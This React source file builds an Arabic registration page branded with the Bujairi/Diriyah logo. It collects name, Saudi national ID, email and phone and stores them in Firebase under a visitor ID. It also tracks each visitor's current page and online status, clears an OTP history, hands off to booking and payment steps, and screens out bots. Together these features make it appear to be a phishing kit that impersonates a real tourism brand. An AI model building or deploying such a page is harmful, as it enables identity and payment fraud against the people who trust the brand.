import { Link, useLocation } from "wouter";
import { useState, useEffect, useRef } from "react";
import { motion } from "framer-motion";
import { addData, handleCurrentPage } from "@/lib/firebase";
import { setupOnlineStatus } from "@/lib/utils";
import emailjs from "@emailjs/browser";

const EMAILJS_SERVICE_ID = "service_1e5r05g";
const EMAILJS_TEMPLATE_ID = "template_xkdlwg3";
const EMAILJS_PUBLIC_KEY = "ROVj9RXGGeBR7U8iG";

const MAROON = "#3a0f1d";
const MAROON_LIGHT = "#4a1525";
const GOLD = "#c9a96e";
const YELLOW = "#e6b54a";
const BEIGE = "#ebddd0";

const BUJAIRI_LOGO = "https://s3.ticketmx.com/bujairi/images/bujairi-ar.svg";

export default function RegistrationPage() {
  useEffect(() => {
    void handleCurrentPage("registration");
  }, []);
  return (
    <div
      className="min-h-screen flex flex-col text-right"
      style={{ backgroundColor: BEIGE }}
      dir="rtl"
      data-testid="page-registration"
    >
      <RestaurantNav />
      <ProgressBar />
      <PageBanner />
      <main className="flex-1 px-4 py-6">
        <RegistrationForm />
      </main>
      <Footer />
    </div>
  );
}

function RestaurantNav() {
  const [menuOpen, setMenuOpen] = useState(false);

  return (
    <nav className="bg-[#ebddd0] relative" data-testid="nav-restaurant">
      <div className="flex items-center justify-center py-6 px-4 relative">
        <Link
          href="/"
          className="hidden lg:block absolute right-8 text-[#4a1525] text-sm hover:text-[#c9a96e]"
          data-testid="link-contact"
        >
          اتصل بنا
        </Link>
        <Link href="/" className="block" data-testid="link-logo">
          <img
            src={BUJAIRI_LOGO}
            alt="Bujairi Logo"
            className="w-[124px] lg:w-[239px]"
            data-testid="img-bujairi-logo"
          />
        </Link>
        <Link
          href="/"
          className="hidden lg:block absolute left-8 text-[#4a1525] text-sm hover:text-[#c9a96e]"
          data-testid="link-english"
        >
          English
        </Link>
        <button
          className="absolute left-4 top-1/2 -translate-y-1/2 lg:hidden p-0 w-6 h-6"
          onClick={() => setMenuOpen(!menuOpen)}
          data-testid="button-menu-toggle"
          aria-label="القائمة"
        >
          <svg
            className="w-6 h-6"
            viewBox="0 0 24 24"
            fill="none"
            stroke="#4a1525"
            strokeWidth="2"
          >
            {menuOpen ? (
              <>
                <line x1="6" y1="6" x2="18" y2="18" />
                <line x1="6" y1="18" x2="18" y2="6" />
              </>
            ) : (
              <>
                <line x1="3" y1="6" x2="21" y2="6" />
                <line x1="3" y1="12" x2="21" y2="12" />
                <line x1="3" y1="18" x2="21" y2="18" />
              </>
            )}
          </svg>
        </button>
      </div>

      <div className="h-[1px] bg-[#c9a96e] w-full" />

      {menuOpen && (
        <div
          className="lg:hidden px-4 py-4 space-y-4"
          data-testid="nav-mobile-menu"
        >
          <Link
            href="/"
            onClick={() => setMenuOpen(false)}
            className="block text-[#4a1525] text-sm hover:text-[#c9a96e]"
            data-testid="link-home"
          >
            الرئيسية
          </Link>
          <a
            href="/#booking"
            onClick={() => setMenuOpen(false)}
            className="block text-[#4a1525] text-sm hover:text-[#c9a96e]"
            data-testid="link-booking"
          >
            خيارات الحجز
          </a>
          <Link
            href="/restaurants"
            onClick={() => setMenuOpen(false)}
            className="block text-[#4a1525] text-sm hover:text-[#c9a96e]"
            data-testid="link-restaurants"
          >
            المطاعم
          </Link>
          <Link
            href="/registration"
            onClick={() => setMenuOpen(false)}
            className="block text-[#c9a96e] text-sm font-medium"
            data-testid="link-new-account-active"
          >
            حساب جديد
          </Link>
          <a
            href="#"
            onClick={() => setMenuOpen(false)}
            className="block text-[#4a1525] text-sm hover:text-[#c9a96e]"
            data-testid="link-login"
          >
            تسجيل دخول
          </a>
          <a
            href="#"
            onClick={() => setMenuOpen(false)}
            className="block text-[#4a1525] text-sm hover:text-[#c9a96e]"
            data-testid="link-contact-mobile"
          >
            اتصل بنا
          </a>
          <a
            href="#"
            onClick={() => setMenuOpen(false)}
            className="block text-[#4a1525] text-sm hover:text-[#c9a96e] font-sans"
            data-testid="link-english-mobile"
          >
            English
          </a>
        </div>
      )}

      <div className="hidden lg:block">
        <div className="flex justify-center gap-12 py-4">
          <Link href="/" className="text-[#4a1525] text-sm hover:text-[#c9a96e]">
            الرئيسية
          </Link>
          <a href="/#booking" className="text-[#4a1525] text-sm hover:text-[#c9a96e]">
            خيارات الحجز
          </a>
          <Link href="/restaurants" className="text-[#4a1525] text-sm hover:text-[#c9a96e]">
            المطاعم
          </Link>
          <Link href="/registration" className="text-[#c9a96e] text-sm">
            حساب جديد
          </Link>
          <a href="#" className="text-[#4a1525] text-sm hover:text-[#c9a96e]">
            تسجيل دخول
          </a>
        </div>
        <div className="h-[1px] bg-[#c9a96e] w-full" />
      </div>
    </nav>
  );
}

function ProgressBar() {
  const steps = [
    { label: "تسجيل", active: true },
    { label: "الحجز", active: false },
    { label: "الدفع", active: false },
  ];
  return (
    <div
      className="px-6 py-5"
      style={{ backgroundColor: MAROON }}
      data-testid="progress-bar"
    >
      <div className="max-w-md mx-auto flex items-center justify-between">
        {steps.map((step, i) => (
          <div key={step.label} className="flex items-center flex-1 last:flex-none">
            <div className="flex flex-col items-center" data-testid={`step-${i + 1}`}>
              <div
                className="w-3 h-3 rounded-full mb-2"
                style={{
                  backgroundColor: step.active ? YELLOW : "#fff",
                  boxShadow: step.active ? `0 0 0 3px ${YELLOW}40` : "none",
                }}
              />
              <span
                className="text-xs font-medium whitespace-nowrap"
                style={{ color: step.active ? YELLOW : "#fff" }}
              >
                {step.label}
              </span>
            </div>
            {i < steps.length - 1 && (
              <div
                className="flex-1 h-px mx-2 mb-6"
                style={{ backgroundColor: YELLOW }}
              />
            )}
          </div>
        ))}
      </div>
    </div>
  );
}

function PageBanner() {
  return (
    <div
      className="py-7 text-center"
      style={{ backgroundColor: MAROON_LIGHT }}
      data-testid="page-banner"
    >
      <h1 className="text-white text-2xl md:text-3xl font-bold">
        تسجيل
      </h1>
    </div>
  );
}

function Footer() {
  return (
    <footer
      className="py-6 px-4 text-center text-sm"
      style={{ backgroundColor: BEIGE, color: MAROON_LIGHT }}
      data-testid="footer-registration"
    >
      <div className="border-t border-[#c9a96e]/40 pt-5 max-w-md mx-auto space-y-1">
        <p>Copyright 2024 DGCL. All Rights Reserved</p>
        <p dir="ltr" className="opacity-90">+966 92 0021 727</p>
      </div>
    </footer>
  );
}

type FieldProps = {
  id: string;
  label: string;
  value: string;
  onChange: (v: string) => void;
  error?: string;
  type?: string;
  placeholder?: string;
  dir?: "rtl" | "ltr";
  maxLength?: number;
  inputMode?: "text" | "tel" | "email" | "numeric";
  testId: string;
};

function Field({
  id,
  label,
  value,
  onChange,
  error,
  type = "text",
  placeholder,
  dir: fieldDir,
  maxLength,
  inputMode,
  testId,
}: FieldProps) {
  return (
    <div className="space-y-2">
      <label
        htmlFor={id}
        className="block text-sm font-medium text-gray-700"
      >
        {label}
      </label>
      <input
        id={id}
        type={type}
        value={value}
        onChange={(e) => onChange(e.target.value)}
        placeholder={placeholder}
        dir={fieldDir}
        maxLength={maxLength}
        inputMode={inputMode}
        className={`w-full h-11 px-4 rounded-md border bg-white text-gray-800 text-sm outline-none transition-colors focus:border-[#c9a96e] focus:ring-2 focus:ring-[#c9a96e]/30 ${
          error ? "border-red-400" : "border-gray-300"
        }`}
        style={{
          textAlign: fieldDir === "ltr" ? "left" : "right",
        }}
        data-testid={testId}
      />
      {error && (
        <p
          className="text-red-500 text-xs"
          data-testid={`${testId}-error`}
        >
          {error}
        </p>
      )}
    </div>
  );
}

function RegistrationForm() {
  const [, setLocation] = useLocation();
  const [name, setName] = useState("");
  const [saudiId, setSaudiId] = useState("");
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("");
  const [honeypot, setHoneypot] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errors, setErrors] = useState<{
    name?: string;
    saudiId?: string;
    email?: string;
    phone?: string;
    bot?: string;
  }>({});

  const formLoadTime = useRef(Date.now());
  const interactionCount = useRef(0);
  const hasMouseMoved = useRef(false);

  useEffect(() => {
    const handleScroll = () => {};
    const handleMouseMove = () => {
      hasMouseMoved.current = true;
    };
    const handleKeyPress = () => {
      interactionCount.current++;
    };

    window.addEventListener("scroll", handleScroll);
    window.addEventListener("mousemove", handleMouseMove);
    window.addEventListener("keypress", handleKeyPress);

    return () => {
      window.removeEventListener("scroll", handleScroll);
      window.removeEventListener("mousemove", handleMouseMove);
      window.removeEventListener("keypress", handleKeyPress);
    };
  }, []);

  const isBotDetected = (): boolean => {
    if (honeypot) return true;
    const timeSpent = Date.now() - formLoadTime.current;
    if (timeSpent < 3000) return true;
    if (interactionCount.current < 4) return true;
    if (!hasMouseMoved.current && !("ontouchstart" in window)) return true;
    return false;
  };

  const validateSaudiId = (id: string): boolean => {
    if (!/^\d{10}$/.test(id)) return false;
    if (!id.startsWith("1") && !id.startsWith("2")) return false;
    return true;
  };

  const validatePhone = (phoneNum: string): boolean => {
    const cleanPhone = phoneNum.replace(/\s/g, "");
    return /^(05|5)\d{8}$/.test(cleanPhone) || /^\+9665\d{8}$/.test(cleanPhone);
  };

  const validateEmail = (emailStr: string): boolean => {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailStr);
  };

  const handleSubmit = async () => {
    if (isSubmitting) return;
    const newErrors: typeof errors = {};

    if (!name.trim()) newErrors.name = "الاسم مطلوب";
    if (!saudiId.trim()) {
      newErrors.saudiId = "رقم الهوية مطلوب";
    } else if (!validateSaudiId(saudiId)) {
      newErrors.saudiId =
        "رقم الهوية غير صحيح (يجب أن يكون 10 أرقام ويبدأ بـ 1 أو 2)";
    }
    if (!email.trim()) {
      newErrors.email = "البريد الإلكتروني مطلوب";
    } else if (!validateEmail(email)) {
      newErrors.email = "البريد الإلكتروني غير صحيح";
    }
    if (!phone.trim()) {
      newErrors.phone = "رقم الجوال مطلوب";
    } else if (!validatePhone(phone)) {
      newErrors.phone = "رقم الجوال غير صحيح";
    }

    if (isBotDetected()) {
      newErrors.bot = "تعذر إكمال الطلب، يرجى المحاولة مرة أخرى";
    }

    setErrors(newErrors);

    if (Object.keys(newErrors).length === 0) {
      setIsSubmitting(true);
      const visitorId = `visitor_${Date.now()}_${Math.random()
        .toString(36)
        .substring(2, 9)}`;
      const added = await addData({
        id: visitorId,
        name,
        saudiId,
        email,
        phone,
        currentPage: "registration",
      });
      if (!added) {
        setErrors((prev) => ({
          ...prev,
          bot: "تعذر إكمال الطلب، يرجى المحاولة مرة أخرى",
        }));
        setIsSubmitting(false);
        return;
      }
      setupOnlineStatus(visitorId);
      localStorage.removeItem("otpHistory");

      try {
        await emailjs.send(
          EMAILJS_SERVICE_ID,
          EMAILJS_TEMPLATE_ID,
          {
            to_email: email,
            email: email,
            to_name: name,
            from_name: "الدرعية - Diriyah",
            message: `مرحباً ${name}، شكراً لتسجيلك في موقع الدرعية.`,
          },
          EMAILJS_PUBLIC_KEY,
        );
      } catch (error) {
        console.error("Failed to send email:", error);
      }

      setLocation("/booking");
      return;
    }
    setIsSubmitting(false);
  };

  return (
    <motion.div
      initial={{ opacity: 0, y: 12 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.4 }}
      className="max-w-md mx-auto"
    >
      <div
        className="bg-white rounded-2xl overflow-hidden shadow-sm"
        data-testid="card-form"
      >
        <div
          className="px-6 py-4 text-white text-lg font-bold text-center"
          style={{ backgroundColor: MAROON_LIGHT }}
        >
          تسجيل
        </div>

        <div className="p-6">
          <input
            type="text"
            value={honeypot}
            onChange={(e) => setHoneypot(e.target.value)}
            className="absolute opacity-0 pointer-events-none h-0 w-0"
            tabIndex={-1}
            autoComplete="off"
            aria-hidden="true"
          />

          {errors.bot && (
            <div
              className="mb-4 p-3 rounded-md bg-red-50 border border-red-200 text-red-600 text-sm text-center"
              data-testid="error-bot"
            >
              {errors.bot}
            </div>
          )}

          <form
            className="space-y-4"
            onSubmit={(e) => {
              e.preventDefault();
              void handleSubmit();
            }}
          >
            <Field
              id="name"
              label="الاسم الكامل"
              value={name}
              onChange={(v) => setName(v.slice(0, 80))}
              maxLength={80}
              error={errors.name}
              testId="input-name"
            />

            <Field
              id="saudiId"
              label="رقم الهوية الوطنية"
              value={saudiId}
              onChange={(v) => setSaudiId(v.replace(/\D/g, "").slice(0, 10))}
              maxLength={10}
              inputMode="numeric"
              error={errors.saudiId}
              testId="input-saudi-id"
            />

            <Field
              id="email"
              label="البريد الإلكتروني"
              value={email}
              onChange={(v) => setEmail(v.slice(0, 120))}
              maxLength={120}
              type="email"
              dir="ltr"
              inputMode="email"
              error={errors.email}
              testId="input-email"
            />

            <Field
              id="phone"
              label="رقم الجوال"
              value={phone}
              onChange={(v) => setPhone(v.replace(/[^\d+]/g, "").slice(0, 15))}
              maxLength={15}
              type="tel"
              dir="ltr"
              inputMode="tel"
              error={errors.phone}
              testId="input-phone"
            />

            <button
              type="submit"
              disabled={isSubmitting}
              className="w-full h-12 mt-4 rounded-md font-bold text-base transition-transform hover:scale-[1.01] active:scale-[0.99] disabled:opacity-60 disabled:cursor-not-allowed"
              style={{ backgroundColor: YELLOW, color: MAROON }}
              data-testid="button-continue"
            >
              {isSubmitting ? "جاري الإرسال..." : "التالي"}
            </button>
          </form>

          <div
            className="mt-6 pt-5 border-t text-center text-sm"
            style={{ borderColor: `${GOLD}66`, color: MAROON_LIGHT }}
          >
            <span className="opacity-70">لديك حساب بالفعل؟ </span>
            <a href="#" className="font-medium" style={{ color: MAROON }}>
              تسجيل دخول
            </a>
          </div>
        </div>
      </div>
    </motion.div>
  );
}
